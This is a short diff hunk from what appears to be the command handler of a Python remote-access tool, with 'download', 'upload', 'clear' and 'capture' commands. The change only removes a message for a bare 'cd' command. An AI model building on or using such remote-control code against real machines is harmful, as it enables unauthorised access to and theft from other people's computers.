@@ -164,8 +164,6 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
                     self.download(cmd[1])
                 elif cmd[0] == "upload":
                     self.upload(cmd[1])
-                elif len(cmd)<2 and cmd[0] == "cd":
-                    print("[-] Please select a directory")
                 elif cmd[0] == "clear":
                     subprocess.call('clear',shell=True)
                 elif cmd[0] == "capture":
